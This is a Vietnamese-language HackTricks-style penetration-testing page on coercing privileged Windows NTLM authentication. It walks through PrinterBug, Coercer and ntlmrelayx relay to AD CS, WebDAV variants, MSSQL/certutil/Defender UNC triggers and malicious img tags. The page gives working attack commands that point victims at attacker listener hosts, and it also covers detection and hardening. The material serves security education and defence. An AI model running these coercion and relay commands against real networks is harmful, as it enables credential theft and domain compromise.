# Buộc Xác thực NTLM Có đặc quyền

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) là một **bộ sưu tập** các **cơ chế kích hoạt xác thực từ xa**, được viết bằng C# và sử dụng trình biên dịch MIDL để tránh phụ thuộc vào bên thứ ba.

## Lạm dụng dịch vụ Spooler

Nếu dịch vụ _**Print Spooler**_ được **bật,** bạn có thể dùng một số thông tin xác thực AD đã biết để **yêu cầu** máy chủ in của Domain Controller **cập nhật** về các lệnh in mới, rồi yêu cầu dịch vụ **gửi thông báo đến một hệ thống bất kỳ**.\
Lưu ý, khi máy in gửi thông báo đến một hệ thống bất kỳ, nó cần **xác thực với** **hệ thống** đó. Vì vậy, kẻ tấn công có thể khiến dịch vụ _**Print Spooler**_ xác thực với một hệ thống bất kỳ, và dịch vụ sẽ **sử dụng tài khoản máy tính** trong quá trình xác thực này.

Về cơ chế hoạt động, primitive **PrinterBug** kinh điển lạm dụng **`RpcRemoteFindFirstPrinterChangeNotificationEx`** qua **`\\PIPE\\spoolss`**. Trước tiên, kẻ tấn công mở một handle đến máy in/máy chủ, sau đó truyền tên máy khách giả vào `pszLocalMachine`, khiến spooler mục tiêu tạo một kênh thông báo **trở lại máy chủ do kẻ tấn công kiểm soát**. Vì vậy, đây là hành vi **ép xác thực đi ra ngoài**, chứ không phải thực thi mã trực tiếp.<sup>[[2]](#references)</sup>\
Nếu bạn đang tìm **RCE/LPE** trong chính spooler, hãy xem [PrintNightmare](printnightmare.md). Trang này tập trung vào **ép xác thực và relay**.

### Tìm máy chủ Windows trong miền

Dùng PowerShell để liệt kê các máy chủ Windows. Máy chủ thường là mục tiêu có mức ưu tiên cao nhất, vì vậy hãy tập trung vào chúng trước:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Tìm các service Spooler đang lắng nghe

Dùng [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) của @mysmartlogin (Vincent Le Toux) đã được chỉnh sửa đôi chút để kiểm tra xem Spooler Service có đang lắng nghe hay không:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Bạn cũng có thể dùng `rpcdump.py` trên Linux và tìm giao thức **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Hoặc nhanh chóng kiểm tra các host từ Linux bằng **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Nếu bạn muốn **liệt kê các bề mặt coercion** thay vì chỉ kiểm tra xem spooler endpoint có tồn tại hay không, hãy dùng **Coercer scan mode**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Điều này hữu ích vì thấy endpoint trong EPM chỉ cho bạn biết giao diện print RPC đã được đăng ký. Điều đó **không** đảm bảo mọi phương thức coercion đều có thể truy cập bằng quyền hiện tại của bạn hoặc máy chủ sẽ tạo ra luồng xác thực có thể sử dụng.

### Yêu cầu service xác thực với một máy chủ bất kỳ

Bạn có thể biên dịch [SpoolSample từ repository gốc](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

hoặc sử dụng [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) hoặc [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) nếu bạn dùng Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Với **Coercer**, bạn có thể nhắm trực tiếp vào các giao diện spooler và không cần đoán phương thức RPC nào được cung cấp:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Callback RPC-over-TCP hiện đại

Đừng cho rằng lời gọi `RpcRemoteFindFirstPrinterChangeNotificationEx` thành công nhất thiết phải tạo lưu lượng trên TCP/445. **Windows 11 22H2 trở lên mặc định dùng RPC over TCP cho giao tiếp in**; RPC over named pipes bị tắt, trừ khi chính sách hoặc `RpcUseNamedPipeProtocol=1` bật lại. Vì vậy, các listener chỉ hỗ trợ SMB cũ có thể báo rằng trigger đã được gửi nhưng không bao giờ nhận callback. Microsoft ghi nhận TCP/135 (Endpoint Mapper) cùng các cổng RPC động được dùng cho RPC in thông thường; các tổ chức có thể giới hạn dải cổng này hoặc chọn một cổng RPC in cố định.<sup>[[10]](#references)</sup>

**Impacket `ntlmrelayx.py`** hiện có RPC relay server và Endpoint Mapper đơn giản, mặc định được bật trên TCP/135. Hỗ trợ này được tích hợp vào tháng 6 năm 2025, với chuỗi PrinterBug-to-AD-CS được trình diễn cụ thể, cho phép relay RPC callback đã xác thực ngay cả khi máy nạn nhân không chuyển sang SMB/WebDAV.<sup>[[11]](#references)</sup>

Hỗ trợ RPC relay/EPM có trong **Impacket 0.13.0 trở lên**. Trước khi tìm nguyên nhân listener TCP/135 không hoạt động, hãy xác minh rằng bạn không chạy một bản `ntlmrelayx.py` cũ được đóng gói sẵn; phần trợ giúp phải hiển thị cả hai tùy chọn RPC-server.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Tìm `Setting up RPC Server on port 135` và `RPCD: Received connection` trong đầu ra của relay. Nếu lệnh gọi RPC trả về lỗi dự kiến nhưng listener không nhận được gì, hãy kiểm tra chính sách truyền tải print RPC trên máy nạn nhân, bộ lọc outbound, phân giải DNS và liệu tiến trình khác đã chiếm TCP/135 hay chưa. Ngoài ra, hãy đảm bảo `ntlmrelayx` không được khởi chạy với `--no-rpc-server`.

### Buộc dùng HTTP thay vì SMB với WebClient

Trên các hệ thống vẫn sử dụng **RPC qua named pipes** (các bản dựng cũ hoặc hành vi được khôi phục bằng chính sách), PrinterBug cổ điển thường tạo ra yêu cầu xác thực **SMB** tới `\\attacker\share`, vẫn hữu ích cho **capture**, **relay tới các mục tiêu HTTP** hoặc **relay khi không có SMB signing**.\
Tuy nhiên, **relay SMB sang SMB** thường bị **SMB signing** chặn, vì vậy operator có thể muốn buộc dùng xác thực **HTTP/WebDAV** thay thế. Đây không phải là phương án dự phòng cho hành vi RPC-over-TCP được mô tả ở trên.

Nếu dịch vụ **WebClient** đang chạy trên mục tiêu, có thể chỉ định listener theo cách khiến Windows sử dụng **WebDAV qua HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Điều này đặc biệt hữu ích khi kết hợp với **`ntlmrelayx --adcs`** hoặc các mục tiêu HTTP relay khác vì không cần dựa vào khả năng relay SMB trên kết nối bị ép buộc. Lưu ý quan trọng là **WebClient phải đang chạy** trên máy nạn nhân để biến thể HTTP/WebDAV hoạt động.

### Kết hợp với Unconstrained Delegation

Nếu kẻ tấn công đã xâm phạm một máy tính được cấu hình [Unconstrained Delegation](unconstrained-delegation.md), họ có thể **ép máy in xác thực với máy tính đó**. **TGT** của tài khoản máy tính máy in sau đó được lưu trong bộ nhớ trên máy chủ unconstrained-delegation, nơi kẻ tấn công có thể lấy và sử dụng lại bằng [Pass the Ticket](pass-the-ticket.md).

### Lưu ý về phát hiện và tăng cường bảo mật

Cách đáng tin cậy nhất để loại bỏ PrinterBug khỏi DC, PAW hoặc máy chủ không dùng để in là dừng và vô hiệu hóa Spooler. Nếu cần in, hãy tăng cường bảo mật cho mọi đích relay có thể có (bật SMB server signing, LDAP signing/channel binding và EPA trên các dịch vụ HTTP như AD CS), thay vì cho rằng chặn TCP/445 trên đường callback là đủ.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Nếu host vẫn cần **in cục bộ**, một biện pháp kiểm soát hạn chế hơn là GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Thiết lập này ngăn spooler chấp nhận kết nối từ client từ xa (và chia sẻ máy in) nhưng vẫn cho phép dịch vụ hoạt động cục bộ; hãy khởi động lại spooler sau khi áp dụng, rồi thực hiện lại các bước kiểm tra khả năng truy cập MS-RPRN ở trên.<sup>[[13]](#references)</sup>

Để phát hiện, cần đối chiếu một lệnh gọi đã xác thực tới UUID MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, đặc biệt là opnum 62/65 với giá trị callback không phải cục bộ, cùng với một kết nối SMB, HTTP hoặc RPC đi ra ngay sau đó từ host spooler. Hãy lập baseline **UUID/opnum của interface và các cặp nguồn/đích**, thay vì chỉ theo dõi truy cập tới `\PIPE\spoolss`, vì các print stack hiện nay có thể gửi callback qua RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Ma trận ép buộc UNC path qua RPC (các interface/opnum kích hoạt xác thực đi ra)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Công cụ: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Ghi chú: interface in bất đồng bộ trên cùng pipe spooler; dùng Coercer để liệt kê các phương thức có thể truy cập trên một host cụ thể<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (cũng có thể thông qua \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Các opnum thường bị lạm dụng: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Công cụ: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Công cụ: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Công cụ: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Công cụ: CheeseOunce<sup>[[1]](#references)</sup>

Lưu ý: Các phương thức này nhận tham số có thể chứa UNC path (ví dụ: `\\attacker\share`). Khi xử lý tham số, Windows sẽ xác thực (trong ngữ cảnh máy/người dùng) tới UNC đó, cho phép bắt hoặc relay NetNTLM.\
Đối với việc lạm dụng spooler, **MS-RPRN opnum 65** vẫn là primitive phổ biến nhất và được tài liệu hóa đầy đủ nhất, vì đặc tả giao thức nêu rõ server tạo một kênh thông báo quay lại client được chỉ định bằng `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: Ép xác thực qua ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN qua \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Chữ ký lời gọi: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Tác động: mục tiêu cố mở đường dẫn log sao lưu được cung cấp và xác thực tới UNC do attacker kiểm soát.<sup>[[1]](#references)</sup>
- Ứng dụng thực tế: ép các tài sản Tier 0 (DC/RODC/Citrix/etc.) gửi NetNTLM, sau đó relay tới các endpoint AD CS (trong các tình huống ESC8/ESC11) hoặc các dịch vụ đặc quyền khác.<sup>[[1]](#references)</sup>

## PrivExchange

Tấn công `PrivExchange` xuất phát từ một lỗ hổng trong **tính năng `PushSubscription` của Exchange Server**. Tính năng này cho phép bất kỳ domain user nào có mailbox buộc Exchange server xác thực qua HTTP tới một host do client chỉ định.

Theo mặc định, **dịch vụ Exchange chạy với quyền SYSTEM** và được cấp quá nhiều đặc quyền (cụ thể là có **quyền WriteDacl trên domain trước Cumulative Update 2019**). Có thể khai thác lỗ hổng này để **relay thông tin tới LDAP rồi trích xuất cơ sở dữ liệu NTDS của domain**. Trong trường hợp không thể relay tới LDAP, lỗ hổng này vẫn có thể được dùng để relay và xác thực tới các host khác trong domain. Khai thác thành công cho phép truy cập ngay vào Domain Admin bằng bất kỳ tài khoản domain user nào đã xác thực.

## Bên trong Windows

Nếu đã ở bên trong máy Windows, bạn có thể buộc Windows kết nối tới một server bằng các tài khoản đặc quyền với:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Hoặc sử dụng kỹ thuật khác này: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Có thể sử dụng lolbin certutil.exe (binary được Microsoft ký) để ép xác thực NTLM:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Qua email

Nếu biết **địa chỉ email** của người dùng đăng nhập vào máy mà bạn muốn xâm nhập, bạn chỉ cần gửi cho họ một **email có hình ảnh 1x1**, chẳng hạn như

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Khi nạn nhân mở nó, Windows sẽ cố gắng xác thực.

### MitM

Nếu bạn có thể thực hiện tấn công MitM và chèn HTML vào trang mà nạn nhân xem, hãy thử chèn một hình ảnh như sau:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Các cách khác để ép buộc và lừa người dùng xác thực NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Crack NTLMv1

Nếu bạn có thể thu thập các challenge [NTLMv1, hãy đọc tại đây cách crack chúng](../ntlm/index.html#ntlmv1-attack).\
_Nhớ rằng để crack NTLMv1, bạn cần đặt challenge của Responder thành "1122334455667788"_



## References

- [1] [Unit 42 – Tấn công cưỡng ép xác thực không ngừng phát triển](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Giao thức điều khiển từ xa EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – Các phương thức xác thực bị cưỡng ép trên Windows](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Cập nhật kết nối RPC cho chức năng in trong Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Máy chủ RPC relay và Endpoint Mapper cho ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Bản phát hành Fortra Impacket 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Cho phép Print Spooler chấp nhận kết nối từ máy khách](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
